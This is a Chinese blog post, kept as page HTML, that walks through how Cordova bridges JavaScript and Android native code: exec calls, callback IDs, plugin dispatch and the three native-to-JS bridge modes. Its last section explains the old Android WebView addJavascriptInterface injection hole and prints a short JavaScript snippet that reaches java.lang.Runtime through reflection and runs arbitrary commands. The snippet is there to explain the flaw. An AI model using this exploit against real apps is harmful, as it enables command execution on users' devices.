<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 所有执行Android方法都是调用这个</div><div class="line"> * @param &#123;Object&#125; success 成功回调</div><div class="line"> * @param &#123;Object&#125; fail 失败回调</div><div class="line"> * @param &#123;Object&#125; service 原生的类名</div><div class="line"> * @param &#123;Object&#125; action 原生的方法名</div><div class="line"> * @param &#123;Object&#125; args 参数，数组格式，个人觉得采用json格式会更好</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">androidExec</span>(<span class="params">success, fail, service, action, args</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (bridgeSecret &lt; <span class="number">0</span>) &#123;</div><div class="line">		<span class="comment">// cordova为了安全考虑，会在页面初始化的时候执行一个“gap_init:”的东西，这里面就是</span></div><div class="line">		<span class="comment">// 在原生随机生成一个数字作为密钥，然后返回给js，js获取之后保存下来，每次执行exec时都必须</span></div><div class="line">		<span class="comment">// 携带这个密钥，否则视作不合法的执行，页面每次刷新密钥都会重新生成</span></div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'exec() called without bridgeSecret'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 默认采用JS_OBJECT桥接模式</span></div><div class="line">    <span class="keyword">if</span> (jsToNativeBridgeMode === <span class="literal">undefined</span>) &#123;</div><div class="line">        androidExec.setJsToNativeBridgeMode(jsToNativeModes.JS_OBJECT);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 将参数中的 ArrayBuffers 转换成字符串</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; args.length; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (utils.typeName(args[i]) == <span class="string">'ArrayBuffer'</span>) &#123;</div><div class="line">            args[i] = base64.fromArrayBuffer(args[i]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">	<span class="comment">// 这里生成一个callbackId，格式是：类名+一个递增的数字</span></div><div class="line">    <span class="keyword">var</span> callbackId = service + cordova.callbackId++,</div><div class="line">        argsJson = <span class="built_in">JSON</span>.stringify(args);</div><div class="line"></div><div class="line">	<span class="comment">// 只要成功和回调有一个被设置了就将这2个方法放到全局的回调池中去（姑且这么称呼）</span></div><div class="line">    <span class="keyword">if</span> (success || fail) &#123;</div><div class="line">        cordova.callbacks[callbackId] = &#123;success:success, fail:fail&#125;;</div><div class="line">    &#125;</div><div class="line">	<span class="comment">// nativeApiProvider.get()就是获取合适的bridgeMode，然后执行</span></div><div class="line">	<span class="comment">// 根据上面的分析可以知道，这里的执行可能是直接调用_cordovaNative.exec，也有可能是调用prompt实现</span></div><div class="line">    <span class="keyword">var</span> msgs = nativeApiProvider.get().exec(bridgeSecret, service, action, callbackId, argsJson);</div><div class="line">	<span class="comment">// 如果是JS_OBJECT模式并且原生没有接收到参数，换成prompt模式再执行一次，执行完了再换回JS_OBJECT模式</span></div><div class="line">	<span class="comment">// 这种情况非常少见，仅限少数设备（如Galaxy S2）当包含特殊Unicode字符时出现，我们可以完全忽略这段代码</span></div><div class="line">    <span class="keyword">if</span> (jsToNativeBridgeMode == jsToNativeModes.JS_OBJECT &amp;&amp; msgs === <span class="string">"@Null arguments."</span>) &#123;</div><div class="line">        androidExec.setJsToNativeBridgeMode(jsToNativeModes.PROMPT);</div><div class="line">        androidExec(success, fail, service, action, args);</div><div class="line">        androidExec.setJsToNativeBridgeMode(jsToNativeModes.JS_OBJECT);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (msgs) &#123;</div><div class="line">		<span class="comment">// 如果exec执行后直接返回了东西，将返回的消息放入数组，然后异步取出再处理</span></div><div class="line">		<span class="comment">//至于这里为何要先放入数组然后再异步取出还没太搞明白</span></div><div class="line">        messagesFromNative.push(msgs);</div><div class="line">        <span class="comment">// Always process async to avoid exceptions messing up stack.</span></div><div class="line">        nextTick(processMessages);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>js暂时说到这里，进入<code>CordovaBridge.jsExec</code>之后调用：</p>
<pre><code>pluginManager.exec(service, action, callbackId, arguments);
</code></pre><p>PluginManager根据service名称获到相应的CordovaPlugin，然后再：</p>
<pre><code>plugin.execute(action, rawArgs, callbackContext)
</code></pre><p>由于Capture是继承自CordovaPlugin的，所以最终调用的是<code>Capture.execute</code>，里面根据action来调用指定的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (action.equals(<span class="string">"captureImage"</span>)) &#123;</div><div class="line">    <span class="keyword">this</span>.captureImage(pendingRequests.createRequest(CAPTURE_IMAGE, options, callbackContext));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后：</p>
<pre><code>Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE)；
//省略其它代码
this.cordova.startActivityForResult((CordovaPlugin) this, intent, req.requestCode);
</code></pre><p>至此就成功启动摄像头了。</p>
<h2 id="原生调用js-1"><a href="#原生调用js-1" class="headerlink" title="原生调用js"></a>原生调用js</h2><p>讲了这么久，终于到了原生调用js了。</p>
<p>补充：</p>
<p>虽然调用摄像头拍照并返回结果按照我们常规理解是异步的，但其实上面启动完摄像头之后，原生立即返回了js一个类似下面这样的消息：</p>
<pre><code>&apos;42 S11 CoreAndroid52457735 {&quot;action&quot;:&quot;pause&quot;}&apos;
</code></pre><p>前端接收到之后有一个专门处理消息的方法<code>processMessages</code>，这个字符串按照一定规则生成，比如S表示成功，S后面的1表示keepCallback，具体我就懒得分析了，最后是调用了一个onMessageFromNative方法，内部调用了：</p>
<pre><code>cordova.fireDocumentEvent(&apos;pause&apos;)
</code></pre><p>这里面自定义了一个名为pause的事件并触发，具体这一步是干嘛还没仔细看。</p>
<p>下面说说原生是如何调用js的。</p>
<p>用户拍照并点击确定后会触发<code>Capture.java</code>的<code>onActivityResult</code>方法(当然取消拍照也会触发)：</p>
<pre><code>pendingRequests.resolveWithSuccess(req)
</code></pre><p>然后</p>
<pre><code>req.callbackContext.sendPluginResult(new PluginResult(PluginResult.Status.OK, req.results))；
</code></pre><p>然后</p>
<pre><code>webView.sendPluginResult(pluginResult, callbackId)
</code></pre><p>然后</p>
<pre><code>nativeToJsMessageQueue.addPluginResult(pluginResult, callbackId);
</code></pre><p>然后</p>
<pre><code>nativeToJsMessageQueue.enqueueMessage(message)
</code></pre><p>然后：</p>
<pre><code>queue.add(message); // 将返回的消息加入队列
if (!paused)
{
    activeBridgeMode.onNativeToJsMessageAvailable(this);
}
</code></pre><p>上面的<code>onNativeToJsMessageAvailable</code>就是原生调用js，具体怎么调，我们再来说说cordova的原生调用js几种方式。</p>
<p>在cordova.js中有这样一段代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">nativeToJsModes = &#123;</div><div class="line">    <span class="comment">// Polls for messages using the JS-&gt;Native bridge.</span></div><div class="line">	<span class="comment">// JS自己执行一个计时器每50毫秒主动到原生的消息队列获取消息</span></div><div class="line">	<span class="comment">// 说实话这种方式我也是醉了，不予置评，貌似几乎没有采用这种方式的情况</span></div><div class="line">    POLLING: <span class="number">0</span>,</div><div class="line">    <span class="comment">// For LOAD_URL to be viable, it would need to have a work-around for</span></div><div class="line">    <span class="comment">// the bug where the soft-keyboard gets dismissed when a message is sent.</span></div><div class="line">	<span class="comment">// 采用传统的loadUrl('javascript:xxx')的方式，这种方式存在输入法自动消失的bug</span></div><div class="line">    LOAD_URL: <span class="number">1</span>,</div><div class="line">    <span class="comment">// For the ONLINE_EVENT to be viable, it would need to intercept all event</span></div><div class="line">    <span class="comment">// listeners (both through addEventListener and window.ononline) as well</span></div><div class="line">    <span class="comment">// as set the navigator property itself.</span></div><div class="line">	<span class="comment">// 采用window.ononline和window.onoffline事件来通知js去原生获取消息，</span></div><div class="line">	<span class="comment">// 原生端则是通过频繁的调用webView.setNetworkAvailable(true/false)来让浏览器联网/掉线</span></div><div class="line">	<span class="comment">// 从而触发online和offline，这种方式我一直在纠结其速度、性能究竟如何？</span></div><div class="line">    ONLINE_EVENT: <span class="number">2</span></div><div class="line">&#125;,</div></pre></td></tr></table></figure>
<p>默认采用<code>ONLINE_EVENT</code>，然后我们再回到Android端，<code>NativeToJsMessageQueue.BridgeMode</code>内部类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BridgeMode</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">onNativeToJsMessageAvailable</span><span class="params">(NativeToJsMessageQueue queue)</span></span>;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">notifyOfFlush</span><span class="params">(NativeToJsMessageQueue queue, <span class="keyword">boolean</span> fromOnlineEvent)</span> </span>&#123;&#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reset</span><span class="params">()</span> </span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>BridgeMode</code>有3种实现，其实你应该猜到了，就是上面提到的3中交互方式：</p>
<h3 id="轮询"><a href="#轮询" class="headerlink" title="轮询"></a>轮询</h3><p>轮询就是采用这种方式，由于是js主动定时到原生获取消息，所以这种方式无需任何操作，所以才叫NoOP。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">NoOpBridgeMode</span> <span class="keyword">extends</span> <span class="title">BridgeMode</span> </span>&#123;</div><div class="line">    <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNativeToJsMessageAvailable</span><span class="params">(NativeToJsMessageQueue queue)</span> </span>&#123;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="loadUrl"><a href="#loadUrl" class="headerlink" title="loadUrl"></a>loadUrl</h3><p>采用 webView.loadUrl(“javascript:”) 来执行js代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadUrlBridgeMode</span> <span class="keyword">extends</span> <span class="title">BridgeMode</span> </span>&#123;</div><div class="line">    <span class="comment">//省略部分代码</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNativeToJsMessageAvailable</span><span class="params">(<span class="keyword">final</span> NativeToJsMessageQueue queue)</span> </span>&#123;</div><div class="line">        cordova.getActivity().runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                String js = queue.popAndEncodeAsJs();</div><div class="line">                <span class="keyword">if</span> (js != <span class="keyword">null</span>) &#123;</div><div class="line">                    engine.loadUrl(<span class="string">"javascript:"</span> + js, <span class="keyword">false</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="online-offline事件"><a href="#online-offline事件" class="headerlink" title="online/offline事件"></a>online/offline事件</h3><p>通过webView.setNetworkAvailable(true/false)来设置webview的联网与掉线，从而触发js的window.ononline和window.onoffline事件，然后再主动通过retrieveJsMessages到原生的消息队列获取消息。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OnlineEventsBridgeMode</span> <span class="keyword">extends</span> <span class="title">BridgeMode</span> </span>&#123;</div><div class="line">	<span class="comment">// 省略部分代码</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNativeToJsMessageAvailable</span><span class="params">(<span class="keyword">final</span> NativeToJsMessageQueue queue)</span> </span>&#123;</div><div class="line">        delegate.runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                <span class="keyword">if</span> (!queue.isEmpty()) &#123;</div><div class="line">                    ignoreNextFlush = <span class="keyword">false</span>;</div><div class="line">                    delegate.setNetworkAvailable(online);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中，<code>OnlineEventsBridgeMode</code>内部有一个名叫<code>OnlineEventsBridgeModeDelegate</code>的接口，在<code>SystemWebViewEngine.java</code>中实现了它：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNetworkAvailable</span><span class="params">(<span class="keyword">boolean</span> value)</span> </span>&#123;</div><div class="line">	webView.setNetworkAvailable(value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>添加事件的时候好像有一个window和document的处理，懒得仔细看了，因为鄙人非常不看好这种方式。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookOnlineApis</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">proxyEvent</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">        cordova.fireWindowEvent(e.type);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// The network module takes care of firing online and offline events.</span></div><div class="line">    <span class="comment">// It currently fires them only on document though, so we bridge them</span></div><div class="line">    <span class="comment">// to window here (while first listening for exec()-releated online/offline</span></div><div class="line">    <span class="comment">// events).</span></div><div class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'online'</span>, pollOnceFromOnlineEvent, <span class="literal">false</span>);</div><div class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'offline'</span>, pollOnceFromOnlineEvent, <span class="literal">false</span>);</div><div class="line">    cordova.addWindowEventHandler(<span class="string">'online'</span>);</div><div class="line">    cordova.addWindowEventHandler(<span class="string">'offline'</span>);</div><div class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'online'</span>, proxyEvent, <span class="literal">false</span>);</div><div class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'offline'</span>, proxyEvent, <span class="literal">false</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">pollOnceFromOnlineEvent</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    pollOnce(<span class="literal">true</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">pollOnce</span>(<span class="params">opt_fromOnlineEvent</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (bridgeSecret &lt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="comment">// This can happen when the NativeToJsMessageQueue resets the online state on page transitions.</span></div><div class="line">        <span class="comment">// We know there's nothing to retrieve, so no need to poll.</span></div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">	<span class="comment">// 主动调用原生方法获取队列中的消息</span></div><div class="line">    <span class="keyword">var</span> msgs = nativeApiProvider.get().retrieveJsMessages(bridgeSecret, !!opt_fromOnlineEvent);</div><div class="line">    <span class="keyword">if</span> (msgs) &#123;</div><div class="line">        messagesFromNative.push(msgs);</div><div class="line">		<span class="comment">// 同步处理消息因为我们确定消息一定在队列的最上面</span></div><div class="line">        processMessages();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>点击拍照并确定之后，收到一个指定格式的字符串，里面包含了刚拍完照片的路径，然后再根据<code>callbackId</code>去回调我们最早设置的2个回调函数：</p>
<p><img src="http://image.liuxianan.com/201607/20160701_154452_690_4135.png" alt=""></p>
<p>好了，终于差不多讲完了，写这么多估计看的人早糊涂了，因为感觉写的太乱了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>终于可以来个总结了。</p>
<p>js调用原生这一块，Android4.2以上（包括）直接采用@JavaScriptInterface注入3个方法，其中最重要的是exec，所有的方法调用都是通过exec来执行，而4.2以下版本由于安全以及其它一些兼容性问题，采用prompt变相实现，这一点我觉得能接受。</p>
<p>原生调用js这一块，轮询就不用说了，太low了，效率也低，无论从哪个角度都不可取；仅仅是为了规避loadUrl执行js时会隐藏输入法这一个问题，转而采用令人无语的online事件，前后端各种无缝配合最终才实现原生传递数据到js，个人觉得有点小题大做了，一个是我觉得输入法自动隐藏那个小问题我能接受，毕竟在用户打字的时候触发某个消息这种情况不是很常见，二来是否可以有其它方法来规避这个问题？而且Android4.4开始已经提供了原生的执行js的方法。</p>
<p>以上仅是个人观点，略太偏激，可能是我眼光太浅有些没考虑到的地方。</p>
<p>//TODO 对了，这里面还有一个原因就是解决同步异步的问题，这个我还没特别仔细看，先放这里。</p>
<h1 id="mui的HTML5-sdk实现"><a href="#mui的HTML5-sdk实现" class="headerlink" title="mui的HTML5+sdk实现"></a>mui的HTML5+sdk实现</h1><p>fds</p>
<h1 id="补充：JS注入漏洞"><a href="#补充：JS注入漏洞" class="headerlink" title="补充：JS注入漏洞"></a>补充：JS注入漏洞</h1><p>具体参见 <a href="http://blog.csdn.net/leehong2005/article/details/11808557/" target="_blank" rel="external">Android WebView的Js对象注入漏洞解决方案</a> 一文。</p>
<p>这里只是简单的转载，本人没有亲测。</p>
<p>由于Android4.2之前，无需给注入的方法添加<code>@JavascriptInterface</code>注解即可注入所有那个类的所有方法，包括<code>getClass</code>，所以：</p>
<ol>
<li>WebView添加了JavaScript对象，并且当前应用具有读写SDCard的权限，也就是：<code>android.permission.WRITE_EXTERNAL_STORAGE</code></li>
<li>JS中可以遍历window对象，找到存在<code>getClass</code>方法的对象的对象，然后再通过反射的机制，得到<code>Runtime</code>对象，然后调用静态方法来执行一些命令，比如访问文件的命令.</li>
<li>再从执行命令后返回的输入流中得到字符串，就可以得到文件名的信息了。然后想干什么就干什么，好危险。</li>
</ol>
<p>核心JS代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">cmdArgs</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>)</div><div class="line">	&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="string">"getClass"</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj])</div><div class="line">		&#123;</div><div class="line">            alert(obj);</div><div class="line">            <span class="keyword">return</span>  <span class="built_in">window</span>[obj].getClass().forName(<span class="string">"java.lang.Runtime"</span>)</div><div class="line">                 .getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2016/07/05/webview-load-local-html/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          Android WebView加载本地网页问题总结
        
      </div>
    </a>
  
  
    <a href="/2016/06/29/mobile-html-input/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">移动端input自动弹出输入法总结</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>


<div class="share_jia">
	<!-- JiaThis Button BEGIN -->
	<div class="jiathis_style">
		<span class="jiathis_txt">Share to: &nbsp; </span>
		<a class="jiathis_button_facebook"></a> 
    <a class="jiathis_button_twitter"></a>
    <a class="jiathis_button_plus"></a> 
    <a class="jiathis_button_tsina"></a>
		<a class="jiathis_button_cqq"></a>
		<a class="jiathis_button_douban"></a>
		<a class="jiathis_button_weixin"></a>
		<a class="jiathis_button_tumblr"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
	</div>
	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
	<!-- JiaThis Button END -->
</div>






<div class="duoshuo">
	<!-- 多说评论框 start -->
	<div class="ds-thread" data-thread-key="cordova-note-js-native-bridge-mode" data-title="Cordova学习笔记（二）JS与Android原生交互" data-url="http://mygit.me/2016/06/30/cordova-note-js-native-bridge-mode/"></div>
	<!-- 多说评论框 end -->
	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
	<script type="text/javascript">
	var duoshuoQuery = {short_name:"lxa"};
	(function() {
		var ds = document.createElement('script');
		ds.type = 'text/javascript';ds.async = true;
		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
		ds.charset = 'UTF-8';
		(document.getElementsByTagName('head')[0] 
		 || document.getElementsByTagName('body')[0]).appendChild(ds);
	})();
	</script>
	<!-- 多说公共JS代码 end -->
</div>




</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 小茗同学
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		root: /
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>